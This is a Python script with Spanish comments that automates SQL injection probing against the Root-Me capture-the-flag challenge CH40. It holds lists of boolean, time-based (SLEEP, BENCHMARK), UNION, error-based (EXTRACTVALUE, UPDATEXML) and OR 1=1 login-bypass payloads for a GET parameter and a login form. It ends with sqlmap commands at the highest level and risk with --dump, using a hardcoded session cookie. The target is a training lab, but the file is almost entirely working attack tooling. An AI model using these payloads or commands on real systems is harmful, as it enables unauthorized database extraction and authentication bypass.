#!/usr/bin/env python3
"""
SQL Injection Time-Based - Auditoría Completa
Root-Me Challenge CH40
"""
import requests
import time
import re
import sys

# CONFIGURACIÓN
URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class SQLInjectionAuditor:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.results = []
        
    def test_get(self, payload):
        """Prueba GET en member"""
        params = {"action": "member", "member": payload}
        try:
            inicio = time.time()
            r = self.session.get(URL, params=params, timeout=10)
            tiempo = time.time() - inicio
            return {
                "time": tiempo,
                "length": len(r.text),
                "content": r.text,
                "status": r.status_code
            }
        except Exception as e:
            return {"error": str(e)}
    
    def test_login(self, username, password):
        """Prueba POST en login"""
        data = {"username": username, "password": password}
        try:
            inicio = time.time()
            r = self.session.post(URL + "?action=login", data=data, timeout=10)
            tiempo = time.time() - inicio
            return {
                "time": tiempo,
                "length": len(r.text),
                "content": r.text,
                "status": r.status_code
            }
        except Exception as e:
            return {"error": str(e)}
    
    def run(self):
        print("=" * 70)
        print("  SQL INJECTION TIME-BASED - ROOT-ME CH40")
        print("=" * 70)
        
        # 1. Baseline
        print("\n[1] Baseline...")
        base = self.test_get("1")
        base_login = self.test_login("admin", "test")
        print(f"    GET baseline: {base['time']:.2f}s, {base['length']} bytes")
        print(f"    POST baseline: {base_login['time']:.2f}s, {base_login['length']} bytes")
        
        # 2. Probar GET member con diferentes técnicas
        print("\n[2] Probando GET member...")
        get_payloads = [
            ("1 AND 1=1", "AND TRUE"),
            ("1 AND 1=2", "AND FALSE"),
            ("1' AND '1'='1", "AND TRUE con comillas"),
            ("1' AND '1'='2", "AND FALSE con comillas"),
            ("1 AND SLEEP(5)", "SLEEP"),
            ("1' AND SLEEP(5)-- -", "SLEEP con comillas"),
            ("1 AND BENCHMARK(10000000, MD5('x'))", "BENCHMARK"),
            ("1 UNION SELECT 1,2,3", "UNION 3 cols"),
            ("1 UNION SELECT 1,2,3,4", "UNION 4 cols"),
            ("1' UNION SELECT 1,2,3-- -", "UNION con comillas"),
        ]
        
        for payload, desc in get_payloads:
            result = self.test_get(payload)
            status = "⚠️" if result.get("time", 0) > base["time"] + 1 else "❌"
            print(f"    {status} {desc:30} -> {result.get('time', 0):.2f}s, {result.get('length', 0)} bytes")
            time.sleep(0.3)
        
        # 3. Probar POST login con diferentes técnicas
        print("\n[3] Probando POST login...")
        login_payloads = [
            ("admin' AND '1'='1", "test", "AND TRUE"),
            ("admin' AND '1'='2", "test", "AND FALSE"),
            ("admin' OR '1'='1", "test", "OR TRUE"),
            ("admin' OR '1'='2", "test", "OR FALSE"),
            ("admin' AND SLEEP(5)-- -", "test", "SLEEP"),
            ("admin' OR SLEEP(5)-- -", "test", "SLEEP OR"),
            ("admin' AND BENCHMARK(10000000, MD5('x'))-- -", "test", "BENCHMARK"),
            ("admin' UNION SELECT 1,2,3-- -", "test", "UNION 3"),
            ("admin' UNION SELECT 1,2,3,4-- -", "test", "UNION 4"),
            ("admin' AND 1=CONVERT(int, @@version)-- -", "test", "ERROR"),
            ("admin' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))-- -", "test", "EXTRACTVALUE"),
            ("admin' AND UPDATEXML(1, CONCAT(0x7e, @@version), 1)-- -", "test", "UPDATEXML"),
        ]
        
        for username, password, desc in login_payloads:
            result = self.test_login(username, password)
            status = "⚠️" if result.get("time", 0) > base_login["time"] + 1 else "❌"
            print(f"    {status} {desc:30} -> {result.get('time', 0):.2f}s, {result.get('length', 0)} bytes")
            time.sleep(0.3)
        
        # 4. Búsqueda de patrones en el contenido
        print("\n[4] Buscando diferencias en contenido...")
        
        # Probar OR 1=1 en GET (debería mostrar más usuarios)
        result = self.test_get("1 OR 1=1")
        if "jsilver" in result.get("content", "") and "jsparow" in result.get("content", ""):
            print("    ✅ OR 1=1 funciona en GET - Muestra todos los usuarios")
        else:
            print("    ❌ OR 1=1 no funciona en GET")
        
        # Probar OR 1=1 en POST (debería loguear)
        result = self.test_login("admin' OR '1'='1", "test")
        if "Authentification error" not in result.get("content", ""):
            print("    ✅ OR 1=1 funciona en POST - Login exitoso")
        else:
            print("    ❌ OR 1=1 no funciona en POST")
        
        # 5. Resumen final
        print("\n" + "=" * 70)
        print("  RESUMEN FINAL")
        print("=" * 70)
        print("""
Si ves:
- ✅ -> La inyección funciona
- ⚠️ -> Puede funcionar (tiempo mayor)
- ❌ -> No funciona

Próximos pasos:
1. Si OR 1=1 funciona en GET -> La vulnerabilidad está en member
2. Si OR 1=1 funciona en POST -> La vulnerabilidad está en login
3. Si ningún OR funciona -> La vulnerabilidad está en otro lugar (cookie, cabecera, etc.)
        """)
        
        # 6. Sugerencia de sqlmap
        print("\n[!] Si nada funciona, ejecuta sqlmap:")
        print("""
sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" \\
       --cookie="PHPSESSID=fbf0fdc633505f66eef3f20808f0d1ce" \\
       --level=5 --risk=3 --batch \\
       --technique=BEUSTQ --time-sec=10 --dump

sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=login" \\
       --cookie="PHPSESSID=fbf0fdc633505f66eef3f20808f0d1ce" \\
       --data="username=admin&password=test" \\
       --level=5 --risk=3 --batch \\
       --technique=BEUSTQ --time-sec=10 --dump
        """)

if __name__ == "__main__":
    auditor = SQLInjectionAuditor()
    auditor.run()
